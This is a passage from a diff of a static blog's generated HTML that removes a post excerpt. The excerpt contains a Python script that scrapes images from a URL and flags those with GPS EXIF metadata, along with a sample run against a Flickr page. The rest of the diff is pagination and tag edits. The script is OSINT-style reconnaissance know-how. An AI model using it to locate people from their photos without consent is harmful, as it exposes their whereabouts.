optparse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL.ExifTags <span class="keyword">import</span> TAGS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findImages</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'[+] Finding images on '</span> + url)</span><br><span class="line">    urlContent = urllib2.urlopen(url).read()</span><br><span class="line">    soup = BeautifulSoup(urlContent)</span><br><span class="line">    imgTags = soup.findAll(<span class="string">'img'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgTags</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadImage</span><span class="params">(imgTag)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">'[+]Downloading image...'</span>)</span><br><span class="line">        imgSrc = imgTag[<span class="string">'src'</span>]</span><br><span class="line">        imgContent = urllib2.urlopen(imgSrc).read()</span><br><span class="line">        imgFileName = basename(urlsplit(imgSrc)[<span class="number">2</span>])</span><br><span class="line">        imgFle = open(imgFileName, <span class="string">'wb'</span>)</span><br><span class="line">        imgFle.write(imgContent)</span><br><span class="line">        imgFle.close()</span><br><span class="line">        <span class="keyword">return</span> imgFileName</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testForExif</span><span class="params">(imgFileName)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exifData = &#123;&#125;</span><br><span class="line">        imgFile = Image.open(imgFileName)</span><br><span class="line">        info = imgFile._getexif()</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            <span class="keyword">for</span> (tag, value) <span class="keyword">in</span> info.items():</span><br><span class="line">                decoded = TAGS.get(tag, tag)</span><br><span class="line">                exifData[decoded] = value</span><br><span class="line">            exifGPS = exifData[<span class="string">'GPSInfo'</span>]</span><br><span class="line">            <span class="keyword">if</span> exifGPS:</span><br><span class="line">                print(<span class="string">'[*]'</span> + imgFileName + <span class="string">'contains GPS MetaData'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">'usage%prog -u &lt;target url&gt;'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-u'</span>, dest=<span class="string">'url'</span>, type=<span class="string">'string'</span>, help=<span class="string">'specify url address'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    url = options.url</span><br><span class="line">    <span class="keyword">if</span> url == <span class="keyword">None</span>:</span><br><span class="line">        print(parser.usage)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        imgTags = findImages(url)</span><br><span class="line">        <span class="keyword">for</span> imgTag <span class="keyword">in</span> imgTags:</span><br><span class="line">            imgFileName = downloadImage(imgTag)</span><br><span class="line">            testForExif(imgFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">forensics: <span class="comment"># python exifFetch.py -u</span></span><br><span class="line">http://www.flickr.com/photos/dvids/4999001925/sizes/o</span><br><span class="line">[+] Finding images on</span><br><span class="line">http://www.flickr.com/photos/dvids/4999001925/sizes/o</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[*] 4999001925_ab6da92710_o.jpg contains GPS MetaData</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/15/python解析Exif元数据/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 
@@ -1563,11 +1574,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color3">Android</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Android</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
